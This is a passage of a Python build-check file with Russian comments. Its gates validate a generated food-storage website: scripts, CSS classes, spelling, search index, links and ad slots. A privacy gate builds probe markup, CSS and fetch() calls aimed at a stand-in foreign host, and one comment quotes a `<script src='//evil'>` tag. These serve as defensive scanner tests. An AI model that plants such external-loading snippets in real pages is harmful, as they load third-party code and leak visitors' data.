    того же объявления и настолько же с ним согласен. Полноту доказывает
    рукописная таблица поломок в самопроверке, где каждый кусок разметки
    написан по перечню URL-несущих атрибутов HTML, а не по этому списку.
    Сюда же — известные ответы `_fetch_verdict` в pure_selftest.
    """
    import render as rd
    evil = "//probe.invalid/x"
    origins = _resource_origins()
    out_ok = _outbound_allowed()
    bad, seen = [], 0
    keys = [c[0] for c in rd.FETCH_CARRIERS]
    if len(keys) != len(set(keys)):
        bad.append("в объявлении несущих повторяется ключ")
    for key, attrs, tags, kind, human in rd.FETCH_CARRIERS:
        seen += 1
        if not human.strip():
            bad.append("несущая «%s» не названа словами" % key)
        if kind not in ("url", "link", "prefetch", "srcset", "list", "css",
                        "meta", "html", "css_text", "css_import", "js",
                        "importmap", "js_attr", "csp", "semilist",
                        "speculation"):
            bad.append("несущая «%s»: вид значения «%s» никто не читает"
                       % (key, kind))
            continue
        if attrs and kind in ("css_text", "css_import", "js",
                              "importmap", "speculation"):
            bad.append("несущая «%s» объявлена атрибутом и текстом сразу"
                       % key)
        page = _carrier_probe(attrs, tags, kind, evil)
        pts = [x for x in _fetch_points(page, rd.FETCH_CARRIERS)
               if x[0] == key]
        if not pts:
            bad.append("несущая «%s» объявлена, а сканер её не видит" % key)
            continue
        if not any(m == "js" or _fetch_verdict(v, m, origins, out_ok)
                   for _k, _h, v, m in pts):
            bad.append("несущая «%s» видна, но чужой адрес на ней проходит"
                       % key)
    return (bad or _seen(seen, "объявленных несущих"))[:8]


def g_served_kinds_are_scanned(files):
    """У КАЖДОГО отданного файла есть объявленный и РАБОТАЮЩИЙ вид разбора.

    ОБЛАСТЬ ГЕЙТА — ЧАСТЬ ГЕЙТА, и на этом сайте это уже второй раз. Гейт
    «браузер не ходит наружу» читал `_html(files)` — страницы. Пока выкладка
    состоит из страниц, карты и robots, разницы не видно; в день, когда
    сборка положит рядом файл стиля, картинку SVG или указатель в `.js`, они
    уедут на сайт НЕПРОЧИТАННЫМИ, а обещание приватности — про всё, что
    грузит браузер, а не про часть выкладки. Непрочитанный файл выглядит
    ровно как чистый.

    Виды объявлены в render.SERVED_KINDS, и сверка идёт в ОБЕ стороны:

      · расширение, которого в объявлении нет, — провал, а не умолчание;
      · объявленный вид обязан быть тем, который сканер умеет читать, и на
        нём чужой адрес обязан получить отказ;
      · у каждого вида написана причина словами: описанный и несуществующий
        рычаг хуже отсутствующего.

    Отказ проверяется на СОБРАННОМ пробнике, а не на выкладке: вид объявляют
    заранее, до первого файла этого вида, и молчащая заготовка — ровно тот
    рычаг, на который потом рассчитывают.

    ЧЕГО ЭТОТ ГЕЙТ НЕ ДОКАЗЫВАЕТ — что объявление полно. Полноту доказывают
    поломки самопроверки: отданный `.css` с чужим `url()`, `.svg` с чужим
    `href`, `.js` с `fetch()`, карта сайта с чужим адресом и файл с
    расширением, которого в объявлении нет.
    """
    import render as rd
    bad, seen = [], 0
    origins = _resource_origins()
    out_ok = _outbound_allowed()
    evil = "//probe.invalid/x"
    probes = {
        "markup": '<img src="%s">' % evil,
        "css": "b{background:url(%s)}" % evil,
        "js": "fetch(%s%s%s)" % (_Q, evil, _Q),
        "urls": "Sitemap: %s/s.xml" % evil,
    }
    exts = [e for e, _k, _w in rd.SERVED_KINDS]
    if len(exts) != len(set(exts)):
        bad.append("в объявлении видов повторяется расширение")
    for ext, kind, why in rd.SERVED_KINDS:
        seen += 1
        # Либо расширение с точки, либо полное имя файла без точки вовсе.
        # Третьего не бывает: «html» без точки совпало бы с файлом по имени
        # html, а «.a.b» — ни с чем.
        if not (ext.startswith(".") or ("." not in ext and "/" not in ext)):
            bad.append("вид «%s» объявлен не расширением и не полным именем"
                       % ext)
        if not why.strip():
            bad.append("вид «%s» не объяснён словами" % ext)
        if kind == "none":
            continue
        if kind not in probes:
            bad.append("вид «%s»: разбор «%s» никто не умеет читать"
                       % (ext, kind))
            continue
        pts = _file_points(("probe" + ext) if ext.startswith(".") else ext,
                           probes[kind])
        if not pts:
            bad.append("вид «%s» объявлен, а сканер по нему ничего не видит"
                       % ext)
            continue
        if not any(m == "js" or _fetch_verdict(v, m, origins, out_ok)
                   for _k, _h, v, m in pts):
            bad.append("вид «%s» читается, но чужой адрес на нём проходит"
                       % ext)
    for p in sorted(files):
        seen += 1
        if _serve_kind(p) is None:
            bad.append("%s: расширение не объявлено в render.SERVED_KINDS"
                       % p)
    return (bad or _seen(seen, "объявленных видов и отданных файлов"))[:8]


def g_scripts(files):
    """Один ИСПОЛНЯЕМЫЙ скрипт на страницу, встроенный, без src и короткий.

    Блок ДАННЫХ (`type="application/json"`) браузер не исполняет: это инертный
    текст, и считать его скриптом незачем. Ограничение на исполняемый код от
    этого не слабеет, а указатель поиска перестаёт упираться в правило,
    написанное не про него.
    """
    import render as rd
    bad = []
    # Загрузчик сети и толчок к нему — ДВА разрешённых исполняемых скрипта
    # сверх собственного, и только когда сеть объявлена включённой.
    limit = 1 + (2 if rd.AD_NETWORK else 0)
    seen = 0
    src_ok = tuple(rd.AD_ORIGINS[rd.AD_NETWORK]) if rd.AD_NETWORK else ()
    for p, t in _html(files).items():
        tags = re.findall(r"<script([^>]*)>(.*?)</script>", t, re.S)
        data = [x for x in tags if _is_data(x[0])]
        code = [x for x in tags if not _is_data(x[0])]
        if len(code) > limit:
            bad.append("%s: исполняемых скриптов %d при пределе %d"
                       % (p, len(code), limit))
        for kind in ("application/ld+json", "application/json"):
            n = len([1 for a, _b in data if kind in a])
            if n > 1:
                bad.append("%s: блоков «%s» %d" % (p, kind, n))
        # Атрибуты читаются РАЗБОРОМ, а не регуляркой на двойные кавычки:
        # `<script src='//evil'>` и `<script src=//evil>` грузят ровно так
        # же, а прежняя проверка видела только одну запись из трёх.
        for attrs, _body in data:
            if "src" in _tag_attrs(attrs):
                bad.append("%s: блок данных со ссылкой" % p)
        for attrs, body in code:
            s = _tag_attrs(attrs).get("src")
            if s is not None and not (src_ok and s.startswith(src_ok)):
                bad.append("%s: скрипт со ссылкой %s" % (p, s[:40]))
            if len(body) > SCRIPT_MAX:
                bad.append("%s: скрипт %d байт" % (p, len(body)))
        seen += len(code)
    return (bad or _seen(seen, "исполняемых скриптов"))[:8]


def g_script_builds_no_markup(files):
    """Скрипт не строит разметку и не содержит обратных слэшей.

    Повторяющийся класс ошибок: экранирование съедается при переносе. На
    соседнем сайте оно съелось в скрипте фильтра — вложенные кавычки в строке
    с разметкой превратились в `shells is not defined`, то есть поиска на
    странице поиска не было вовсе при двадцати зелёных гейтах.

    Правило, закрывающее класс: сообщения и ссылки живут в РАЗМЕТКЕ, скрипт
    только переключает состояние. Тогда вложенных кавычек не возникает, и
    обратный слэш в теле скрипта становится признаком беды.

    У блока данных проверка другая и более прямая: он обязан РАЗБИРАТЬСЯ как
    JSON (иначе страница молча остаётся без поиска) и не содержать «<».
    """
    bad, seen = [], 0
    for p, t in _html(files).items():
        for attrs, body in re.findall(r"<script([^>]*)>(.*?)</script>",
                                      t, re.S):
            seen += 1
            if _is_data(attrs):
                try:
                    json.loads(body)
                except ValueError:
                    bad.append("%s: блок данных не разбирается как JSON" % p)
                if "<" in body:
                    bad.append("%s: в блоке данных знак «<»" % p)
                continue
            if chr(92) in body:
                bad.append("%s: в скрипте обратный слэш" % p)
            if re.search(r"innerHTML|outerHTML|document.write", body):
                bad.append("%s: скрипт строит разметку" % p)
            if re.search(r"<[a-z]+[ >]", body):
                bad.append("%s: в скрипте теги" % p)
    return (bad or _seen(seen, "блоков script"))[:8]


def g_no_double_escape(files):
    """Ни одной дважды экранированной сущности в отданном.

    «&amp;mdash;» печаталось словом в ячейке таблицы: заглушку прогнали через
    экранирование, которое и превращает «&» в «&amp;». Такая строка ВСЕГДА
    дефект — её никто не хочет видеть.
    """
    bad, seen = [], 0
    for p, t in _html(files).items():
        seen += 1
        for m in re.finditer(r"&amp;[a-zA-Z]+;|&amp;#[0-9]+;", t):
            bad.append("%s: «%s»" % (p, m.group(0)))
    return (bad or _seen(seen, "страниц"))[:8]


def g_css_classes_used(files):
    """Каждый класс, объявленный в CSS, встречается в разметке.

    Класс без применения — либо забытая правка, либо рычаг, которого нет.
    Описанный и несуществующий рычаг хуже отсутствующего: на него рассчитывают.
    """
    import design
    import render as rd
    declared = set(re.findall(
        r"[.]([a-z][a-z0-9-]*)",
        design.CSS + (design.AD_CSS if rd.ADS else "")))
    used = set()
    for t in _html(files).values():
        for attr in re.findall(r'class="([^"]*)"', t):
            used.update(attr.split())
        for body in re.findall(r"<script[^>]*>(.*?)</script>", t, re.S):
            used.update(re.findall(r"'([a-z][a-z0-9-]*)'", body))
    missing = sorted(declared - used)
    bad = ["класс объявлен в CSS и не встречается в разметке: %s"
           % ", ".join(missing[:8])] if missing else []
    return bad or _seen(len(declared), "объявленных классов")


def g_css_classes_declared(files):
    """Каждый класс из разметки объявлен в CSS.

    ВТОРАЯ сторона предыдущего гейта, и вопрос она задаёт другой. Правило без
    носителя — забытая правка. Носитель без правила — брак, который ВИДНО: на
    соседнем сайте класс подписи не был объявлен нигде, и напряжение слиплось
    с подписью в 520 ячейках при всех зелёных гейтах.
    """
    import design
    import render as rd
    declared = set(re.findall(
        r"[.]([a-z][a-z0-9-]*)",
        design.CSS + (design.AD_CSS if rd.ADS else "")))
    used = set()
    for t in _html(files).values():
        for attr in re.findall(r'class="([^"]*)"', t):
            used.update(attr.split())
    extra = sorted(used - declared)
    bad = ["класс есть в разметке и не объявлен в CSS: %s"
           % ", ".join(extra[:8])] if extra else []
    return bad or _seen(len(used), "применённых классов")


# Размер выборки последнего гейта. Пишется _seen, читается run: гейт обязан
# НАЗВАТЬ, сколько он посмотрел, и число это печатается рядом с «пройден».
# Молчащий гейт неотличим от пройденного — ровно этим 27 гейтов из 30 и были
# зелёными на сломанном сайте.
_SAMPLE = []


def _seen(n, what):
    """Гейт, не проверивший ни одной страницы, — это не «пройден».

    D-020: пустая выборка есть провал. Гейты пропускают страницы, на которых
    проверять нечего; поштучно это верно, а в целом означало бы, что
    сломанный селектор выглядит зелёным.

    Побочное действие сознательное: вызов ОБЪЯВЛЯЕТ размер выборки. Гейт, ни
    разу не позвавший _seen, run объявляет провалом — иначе правило «пустая
    выборка краснеет» держалось бы на памяти того, кто пишет следующий гейт.
    """
    _SAMPLE.append((int(n), what))
    return [] if n else ["ни одна страница не проверена: %s" % what]


def g_readme_numbers(files):
    """Числа в README совпадают с тем, что собралось.

    За один сеанс пришлось править вручную четыре: 234 против 220 страниц,
    27 против 29 гейтов, 88 против 87 и 73 против 69. Каждое было верным в
    день, когда его написали. Тот же класс дефекта, что «доска обещает 160
    оболочек при 11 страницах».
    """
    path = os.path.join(HERE, "README.md")
    if not os.path.isfile(path):
        return ["README.md не найден"]
    doc = io.open(path, encoding="utf-8").read()
    bad = []
    checks = [
        (r"(\d+) страниц[аы]? продуктов", len(_products(files)),
         "страниц продуктов"),
        # Число согласуется с русской грамматикой: 33 — «гейта», 30 —
        # «гейтов». Гейт, требующий одной формы, заставлял писать неверно.
        (r"# (\d+) гейт(?:ов|а|)\b", GATE_COUNT, "гейтов"),
        # Третье число: сколько файлов уезжает на выкладку. Оно расходилось
        # молча — README обещал 250 при 244 отданных, — и проверять его
        # некому, кроме этого гейта.
        (r"(\d+) файл[а-я]* на выкладку", len(files), "файлов выкладки"),
    ]
    for pat, want, what in checks:
        m = re.search(pat, doc)
        if not m:
            bad.append("README не называет %s" % what)
        elif int(m.group(1)) != want:
            bad.append("README обещает %s %s, а их %d"
                       % (m.group(1), what, want))
    return bad or _seen(len(checks), "чисел README")


def g_words_match_markup(files):
    """Слово, описывающее разметку, требует этой разметки на той же странице.

    Смена облика оставила 408 упоминаний таблицы на сайте без единой таблицы:
    «Give the table the day it went into storage» — а поля даты уже стали
    строками бланка. Ни один структурный гейт этого не увидел, потому что все
    они читают РАЗМЕТКУ, а врал ТЕКСТ.

    Гейт читает видимый текст — без style и script, иначе `text-align:right`
    из таблицы стилей считается словом «right», как случилось при первом
    прогоне этой проверки руками.
    """
    pairs = ((r"the tables?\b", r"<table[ >]", "таблица"),
             (r"\bcolumns?\b", r"<t[hd][ >]", "столбец"),
             (r"the charts?\b", r"<(?:svg|canvas)[ >]", "график"),
             (r"the map\b", r"<(?:svg|map)[ >]", "карта"))
    bad, seen = [], 0
    for p, t in _html(files).items():
        seen += 1
        vis = _visible(t)
        for word, markup, ru in pairs:
            n = len(re.findall(word, vis, re.I))
            if n and not re.search(markup, t):
                bad.append("%s: сказано «%s» %d раз, разметки нет"
                           % (p, ru, n))
    return (bad or _seen(seen, "страниц"))[:8]


# Британское написание. Рынок сайта один — США, и слово, которое там пишут
# иначе, читатель считывает как «писали не для меня». Ловится ВИДИМЫЙ текст:
# имена функций в питоне пусть остаются какими есть, на страницу они не идут.
BRITISH = (r"neighbour\w*", r"behaviour\w*", r"flavour\w*", r"colour\w*",
           r"favour\w*", r"labour\w*", r"recognise\w*", r"organise\w*",
           r"analyse\w*", r"enrolment", r"defence", r"licence\b",
           r"practise\w*", r"centre\b", r"litre\w*", r"metre\w*",
           # Слова, которые именно на сайте про еду и появятся первыми:
           # плесень, йогурт, фольга, пастеризация, карамелизация.
           r"mould\w*", r"yoghurt\w*", r"aluminium", r"sulphur\w*",
           r"fibre\w*", r"odour\w*", r"vapour\w*", r"savour\w*",
           r"pasteurise\w*", r"homogenise\w*", r"caramelise\w*",
           r"tenderise\w*", r"sterilise\w*",
           # Общая лексика и оканчания. «-isation» безопасно целиком;
           # «-ised» и «-ising» — НЕТ: «compromised», «advertising» и
           # «arising» стоят в сборке и написаны по-американски.
           r"\w+isation\b", r"apologise\w*", r"criticise\w*",
           r"emphasise\w*", r"prioritise\w*", r"utilise\w*",
           r"minimise\w*", r"maximise\w*", r"summarise\w*",
           r"specialise\w*", r"standardise\w*", r"normalise\w*",
           r"memorise\w*", r"categorise\w*", r"characterise\w*",
           r"itemise\w*", r"grey\b", r"whilst", r"amongst",
           r"programme\w*", r"catalogue\w*", r"storey\w*",
           r"judgement\w*", r"ageing", r"travelled", r"travelling",
           r"cancelled", r"labelled", r"marvellous")


# Атрибуты, в которых живёт ТЕКСТ, а не разметка. Читаются наравне с видимым
# текстом: британское слово в описании страницы не видно ни одной проверке,
# которая смотрит только на то, что нарисовано.
TEXT_ATTRS = ("content", "alt", "title", "aria-label", "placeholder",
              "data-hint", "data-label", "data-plain", "data-stop")


def g_us_spelling(files):
    """Ни одного британского написания в видимом тексте.

    Одно слово в одном общем абзаце уехало на 277 страниц, второе на 94: это
    не опечатка, а то, как выглядит любая фраза, написанная не думая о рынке.
    Словарь в генераторе чинит найденное, гейт чинит будущее — иначе вернётся
    с первой же новой фразой.
    """
    bad, seen = [], 0
    for p, t in sorted(_html(files).items()):
        # ОБЛАСТЬ ГЕЙТА — ЧАСТЬ ГЕЙТА. Видимого текста мало: описание в
        # выдаче — единственная строка, которую человек читает ДО перехода,
        # и в видимый текст она не попадает вовсе. Туда же подписи для
        # читалок и подсказки полей: их «видит» тот, кто сайтом иначе и не
        # пользуется. Список атрибутов ОБЪЯВЛЕН — молча появившийся новый
        # носитель текста должен быть замечен, а не пропущен.
        vis = _visible(t)
        for attr in TEXT_ATTRS:
            for m in re.finditer(r'\s%s="([^"]*)"' % attr, t):
                vis += " " + unescape(m.group(1))
        seen += 1
        for pat in BRITISH:
            hits = re.findall(pat, vis, re.I)
            if hits:
                bad.append("%s: «%s» %d раз" % (p, hits[0], len(hits)))
    return (bad or _seen(seen, "страниц прочитано"))[:8]


def g_ids_unique(files):
    """Ни один id не повторяется на странице.

    Найдено самопроверкой: поле даты для отсчёта «opened» печаталось и на
    бирке, и в корешке. `getElementById` возвращает первый узел, второй
    `<label for>` указывает в никуда, а гейт «у каждого отсчёта своё поле»
    видел живой первый экземпляр и молчал. Дубликат id — это брак, который
    ВИДНО только в браузере, поэтому его ловит отдельная проверка.
    """
    bad, n = [], 0
    for p, t in _html(files).items():
        ids = re.findall(r'[ ]id="([^"]+)"', t)
        n += len(ids)
        seen, dup = set(), []
        for x in ids:
            if x in seen and x not in dup:
                dup.append(x)
            seen.add(x)
        if dup:
            bad.append("%s: id повторяется — %s" % (p, ", ".join(dup[:4])))
    return (bad or _seen(n, "id в разметке"))[:8]


def g_no_self_links(files):
    """Ни одна страница не ссылается сама на себя.

    Петля: человек нажимает и остаётся на месте без единого слова объяснения.
    На соседнем сайте таких ссылок было 205 из 720.
    """
    bad, seen = [], 0
    for p, t in _html(files).items():
        own = "/" + p[:-len("index.html")] if p.endswith("index.html") else None
        if not own:
            continue
        seen += 1
        for href in re.findall(r'href="([^"]*)"', t):
            if href == own:
                bad.append("%s ссылается сама на себя" % p)
                break
    return (bad or _seen(seen, "страниц со своим адресом"))[:8]


def g_dist_matches_build(files):
    """Файлы на диске совпадают с тем, что выдаёт сборка.

    Гейты читают то, что построено в памяти. Однажды это разошлось с диском:
    функция уехала ниже блока `__main__`, запуск файла упал, а импорт модуля
    остался зелёным поверх прошлой выкладки. Тот же гейт закрывает правку
    руками поверх сгенерированного.
    """
    if not os.path.isdir(DIST):
        return ["выкладки нет: сначала python render.py"]
    bad, seen = [], set()
    for root, _dirs, names in os.walk(DIST):
        for n in names:
            full = os.path.join(root, n)
            rel = os.path.relpath(full, DIST).replace(os.sep, "/")
            seen.add(rel)
            if rel not in files:
                bad.append("на диске лишний файл: %s" % rel)
                continue
            disk = io.open(full, encoding="utf-8", newline="").read()
            if disk != files[rel]:
                bad.append("на диске не то, что собрано: %s" % rel)
    for rel in files:
        if rel not in seen:
            bad.append("на диске нет собранного: %s" % rel)
    return sorted(bad or _seen(len(seen), "файлов на диске"))[:8]


ENTITIES = (("&amp;", "&"), ("&quot;", chr(34)), ("&middot;", chr(183)),
            ("&mdash;", chr(8212)), ("&hellip;", chr(8230)),
            ("&deg;", chr(176)), ("&nbsp;", " "), ("&times;", chr(215)),
            ("&divide;", chr(247)), ("&copy;", chr(169)),
            ("&lt;", "<"), ("&gt;", ">"))


def unescape(t):
    """Как это видит человек. Гейт, сверяющий имя с разметкой, спорил с
    экранированием: «Whole wheat bread, commercially baked & pre-sliced» стоит
    на странице как «&amp;», и гейт объявлял, что имени там нет."""
    for a, b in ENTITIES:
        t = t.replace(a, b)
    return t



def _visible(t):
    """Видимый текст страницы. style и script вырезаются ПЕРВЫМИ: иначе
    `text-align:right` из таблицы стилей считается словом «right», как уже
    случилось при первом прогоне проверки слов."""
    t = re.sub(r"<(script|style)[^>]*>.*?</\1>", " ", t, flags=re.S)
    t = re.sub(r"<[^>]+>", " ", t)
    return unescape(re.sub(r"\s+", " ", t))

def g_search_index_resolves(files):
    """Поиск есть НА КАЖДОЙ странице, ведёт на существующее, и имя, по
    которому туда привели, есть НА ТОЙ странице.

    Прежний гейт смотрел ОДНУ страницу — главную, — и поэтому молчал о том,
    что поле поиска стоит на 1 странице из 242, а остальные 241 несут его
    стили без единого узла разметки. Область гейта — часть гейта.

    Гейт внутренних ссылок читает РАЗМЕТКУ: href в теге. Адреса поиска лежат в
    блоке данных, то есть в тексте, и мимо того гейта проходят целиком.
    """
    pages = _html(files)
    bad, seen, base, where = [], 0, None, None
    for p, t in sorted(pages.items()):
        if 'id="ku-find"' not in t:
            bad.append("%s: нет поля поиска" % p)
        m = re.search(r'<script type="application/json" id="ku-index">'
                      r"(.*?)</script>", t, re.S)
        if not m:
            bad.append("%s: нет указателя поиска" % p)
            continue
        seen += 1
        if base is None:
            base, where = m.group(1), p
        elif m.group(1) != base:
            bad.append("%s: указатель отличается от указателя на %s"
                       % (p, where))
    if base is None:
        return ["ни на одной странице нет указателя поиска"]
    try:
        rows = json.loads(base)
    except ValueError:
        return ["блок данных поиска не разбирается"]
    if len(rows) < 100:
        bad.append("в указателе поиска строк %d" % len(rows))
    # Список слов-обрамлений объявлен в генераторе и обязан доехать до
    # разметки: описанный и не отрисованный рычаг хуже отсутствующего.
    import render as rd
    for p, t in sorted(pages.items()):
        if 'data-stop="%s"' % rd.FIND_STOP not in t:
            bad.append("%s: слова-обрамления запроса не объявлены" % p)
            break
    # Строка на ПРОДУКТ: столько строк, сколько страниц товаров. Пока строка
    # была на каждое имя и склеивалась по ключу, «deli meat» уводил на один
    # продукт из трёх, у которых это имя есть.
    prods = len([1 for p, t in pages.items() if _page_type(t) == "product"])
    if len(rows) != prods:
        bad.append("строк указателя %d, страниц товаров %d"
                   % (len(rows), prods))
    for row in rows:
        if len(row) != 4:
            bad.append("строка указателя не из четырёх полей: %s" % row[:1])
            continue
        name, href, own_v, aliases = row
        target = href.strip("/") + "/index.html"
        if target not in files:
            bad.append("поиск ведёт на несуществующее: %s -> %s" % (name, href))
            continue
        if not own_v:
            bad.append("строка поиска без описания: %s" % name)
        if not isinstance(aliases, list):
            bad.append("имена продукта не списком: %s" % name)
            continue
        page = unescape(files[target])
        for nm in [name] + aliases:
            if not re.search(r"(?<![A-Za-z0-9])%s(?![A-Za-z0-9])"
                             % re.escape(nm), page, re.I):
                bad.append("поиск ведёт на %s по имени «%s», а имени там нет"
                           % (href, nm))
    return (bad or _seen(seen, "страниц с указателем поиска"))[:8]


def g_no_dead_controls(files):
    """Ни одного контрола, который без скрипта ничего не делает.

    Найдено в браузере с выключенными скриптами: на странице продукта стояло
    живое на вид поле даты и подпись «PICK THE DAY ABOVE», которая не
    сбывалась никогда, а на главной — поле поиска, которое не искало, и
    объяснения к нему не было: подсказка стояла с атрибутом `hidden`.
    Описанный и несуществующий рычаг хуже отсутствующего.

    Правило, закрывающее класс: КАЖДЫЙ контрол строит скрипт, а в разметке на
    его месте стоит то, что работает без скрипта, — величина или ссылка.
    """
    bad, seen = [], 0
    for p, t in sorted(_html(files).items()):
        seen += 1
        for tag in ("input", "select", "textarea", "button"):
            if re.search(r"<%s[ >/]" % tag, t):
                bad.append("%s: в разметке готовый <%s>" % (p, tag))
        # Строка с датой обязана нести то, что печатается без скрипта, и это
        # не может быть указанием, требующим скрипта.
        for attrs in re.findall(r"<(?:td|span|div)([^>]*data-lo=[^>]*)>", t):
            m = re.search(r'data-plain="([^"]*)"', attrs)
            if not m or not m.group(1).strip():
                bad.append("%s: датируемой строке нечего показать без скрипта"
                           % p)
                continue
            if not re.search(r"[0-9]", m.group(1)):
                bad.append("%s: без скрипта строка не называет срока: «%s»"
                           % (p, m.group(1)[:40]))
        # Поле поиска без скрипта — ссылка на указатель. На самом указателе
        # её нет: ссылка страницы на саму себя это петля.
        if 'id="ku-find"' in t:
            own = "/" + p[:-len("index.html")] if p.endswith("index.html") \
                else None
            if own != "/all/" and 'class="findp"' not in t:
                bad.append("%s: поиск без работающей замены" % p)
    return (bad or _seen(seen, "страниц"))[:8]


def g_page_leads_up_and_sideways(files):
    """Со страницы товара есть ход ВВЕРХ и ВБОК.

    Замерено по собранному: 0 страниц товаров из 221 вели в свою рубрику, 0 —
    в любую витрину, «Produce · USDA FoodKeeper» на кромке было мёртвым
    текстом, а `TOP_LINKS` объявлен в генераторе и не отрисован ни разу.
    Ссылок внутрь вело: на /contact/ — 462, на /longest-keeping/ — одна.

    Проверяется и обратная сторона: КАЖДЫЙ объявленный вход обязан быть
    отрисован хоть где-то. Рычаг, который описан и не существует, хуже
    отсутствующего — на него рассчитывают.
    """
    import render as rd
    pages = _html(files)
    hubs = {p[len("category/"):-len("/index.html")]
            for p in pages if p.startswith("category/")}
    bad, seen = [], 0
    for p, t in sorted(_products(pages).items()):
        seen += 1
        hrefs = set(re.findall(r'href="([^"]+)"', t))
        cats = {h for h in hrefs if h.startswith("/category/")}
        if hubs and not cats:
            bad.append("%s: ни одной ссылки в рубрику" % p)
        side = [h for h in hrefs
                if re.match(r"^/[a-z0-9-]+/$", h)
                and h.strip("/") + "/index.html" in pages
                and _page_type(pages[h.strip("/") + "/index.html"]) == "product"]
        if len(side) < 2:
            bad.append("%s: ходов вбок %d" % (p, len(side)))
        # /all/ стоит в замене поиска на каждой странице, и если считать
        # его витриной, ветка не сможет покраснеть никогда.
        ranks = {h for h, _t in rd.TOP_LINKS if h != "/all/"} & hrefs
        if not ranks:
            bad.append("%s: ни одной ссылки на витрину" % p)
    everywhere = set()
    for t in pages.values():
        everywhere |= set(re.findall(r'href="([^"]+)"', t))
    for href, txt in rd.TOP_LINKS:
        if href not in everywhere:
            bad.append("объявленный вход «%s» не отрисован нигде" % txt)
    return (bad or _seen(seen, "страниц товаров"))[:8]


def _plural_head(name):
    """Множественное ли главное слово имени. Правило записано ЗДЕСЬ отдельно
    от генератора: гейт, спрашивающий у проверяемой функции, согласен сам с
    собой и остаётся зелёным, когда её ломают."""
    head = re.split(r"[,(]", name)[0].strip()
    w = re.findall(r"[A-Za-z]+", head)
    if not w:
        return False
    w = w[-1].lower()
    if len(w) < 3 or not w.endswith("s"):
        return False
    return not (w.endswith("ss") or w.endswith("us") or w.endswith("is")
                or w.endswith("os"))


def g_page_carries_the_query(files):
    """Страница несёт слова, которыми её ищут, и согласует при них глагол.

    Замерено по собранному: «how long» не стояло ни в одном заголовке, слово
    «last» встречалось во всём корпусе ОДИН раз, а «shelf life», «expire» и
    «how to store» — ноль. Головной запрос ниши — «how long does X last in the
    fridge», и до этой правки страница не несла его нигде.

    Вторая сторона — согласование: 66 описаний в выдаче читались «How long
    Apples keeps in the fridge».
    """
    bad, seen = [], 0
    for p, t in sorted(_products(files).items()):
        seen += 1
        m = re.search(r"<h1[^>]*>(.*?)</h1>", t, re.S)
        if not m:
            bad.append("%s: нет заголовка" % p)
            continue
        h1 = unescape(re.sub(r"<[^>]+>", " ", m.group(1)))
        h1 = " ".join(h1.split())
        q = re.match(r"^How long (do|does) (.+?) (last[^?]*)[?]$", h1)
        if not q:
            bad.append("%s: заголовок не задаёт вопроса: «%s»" % (p, h1[:60]))
            continue
        want = "do" if _plural_head(q.group(2)) else "does"
        if q.group(1) != want:
            bad.append("%s: «How long %s %s», а имя требует «%s»"
                       % (p, q.group(1), q.group(2)[:30], want))
        head = unescape(re.search(r"<title>(.*?)</title>", t, re.S).group(1))
        if q.group(2).lower() not in head.lower():
            bad.append("%s: имени «%s» нет в заголовке выдачи"
                       % (p, q.group(2)[:30]))
    # Согласование проверяется и в описании выдачи, на всех типах страниц.
    for p, t in sorted(_html(files).items()):
        m = re.search(r'<meta name="description" content="([^"]*)"', t)
        if not m:
            continue
        d = unescape(m.group(1))
        # search, а не match: описание начинается с ответа («Apples: 4
        # weeks sealed in the fridge. How long Apples keep...»), и
        # привязка к началу строки оставляла ветку мёртвой — она не могла
        # покраснеть никогда.
        v = re.search(r"How long (.+?) (keeps|keep)\b", d)
        if v and (v.group(2) == "keep") != _plural_head(v.group(1)):
            bad.append("%s: описание «How long %s %s»"
                       % (p, v.group(1)[:30], v.group(2)))
    return (bad or _seen(seen, "страниц товаров"))[:8]


def g_number_agrees_with_verb(files):
    """Число и слово рядом с ним согласованы — и глагол, и существительное.

    Глагол: «1 food below keep longer» — единица с множественным числом
    выдаёт шаблон, в который подставили число, не посмотрев на результат.

    Существительное: строка расчёта печатала «240 days frozen &divide; 1 days
    sealed» на четырёх страницах. Гейт проверял только глагол и молчал —
    у согласования, как и у соответствия классов, ДВЕ стороны.
    """
    bad = []
    verbs = ("keep", "hold", "run", "last", "share", "have", "are", "do",
             "gain", "lose", "sit", "take", "stay")
    nouns = ("days", "weeks", "months", "years", "hours", "rows", "foods",
             "items", "entries", "figures", "pages", "categories", "times",
             "methods", "comparisons", "neighbours", "ranges")
    vpat = re.compile(r"(?<![\w.])1 [a-z]+(?: [a-z]+){0,3} (%s)\b"
                      % "|".join(verbs))
    npat = re.compile(r"(?<![\w.])1 (%s)\b" % "|".join(nouns))
    seen = 0
    for p, t in _html(files).items():
        seen += 1
        vis = _visible(t)
        for m in vpat.finditer(vis):
            bad.append("%s: «%s»" % (p, " ".join(m.group(0).split())))
        for m in npat.finditer(vis):
            bad.append("%s: «%s»" % (p, " ".join(m.group(0).split())))
    return (bad or _seen(seen, "страниц"))[:8]

def _page_type(t):
    m = re.search(r'name="page-type" content="([a-z]+)"', t)
    return m.group(1) if m else ""


def _ad_divs(t):
    """Рекламные места страницы: (класс, содержимое)."""
    return re.findall(r'<div class="ad (ad-[a-z0-9-]+)">(.*?)</div>', t, re.S)


def g_ad_inventory(files):
    """Места стоят ровно там, где объявлено, и ни одно не пустое.

    Гейт переписан: прежний сторожил ОТСУТСТВИЕ рекламы («место есть, а
    реклама выключена») и краснел бы ровно в тот день, когда сайт начал бы
    зарабатывать. Сторожить надо не отсутствие, а правильность.

    Проверяется в ОБЕ стороны по render.AD_PLACEMENT: чего в объявлении нет
    — того нет и на странице, и наоборот. Плюс два запрета, каждый купленный
    ошибкой:

      · место без содержимого не заводится вовсе. Узел с `display:none`
        остаётся ребёнком и ломает правила «последний теряет линию»: 540
        невидимых мест сломали пять правил на 157 страницах соседнего сайта,
        а 322 страницы другого несли пустую серую коробку с подписью
        «Advertisement»;
      · на странице-ошибке и на правовых страницах рекламы нет: реклама на
        экране без содержимого — прямое нарушение правил размещения.

    Пустая выборка — провал: гейт, не нашедший ни одной страницы с рекламой
    при включённой рекламе, выглядит ровно как пройденный.
    """
    import render as rd
    bad, seen, pages = [], 0, 0
    for p, t in sorted(_html(files).items()):
        pages += 1
        kind = _page_type(t)
        want = list(rd.AD_PLACEMENT.get(kind, ())) if rd.ADS else []
        got = _ad_divs(t)
        classes = [c for c, _b in got]
        if classes != want:
            bad.append("%s (%s): места %s, объявлено %s"
                       % (p, kind or "?", classes or "нет", want or "нет"))
        for cls, body in got:
            if not re.sub(r"<[^>]+>|\s", "", body):
                bad.append("%s: место %s пусто" % (p, cls))
            seen += 1
        if "noindex" in t and classes:
            bad.append("%s: реклама на неиндексируемой странице" % p)
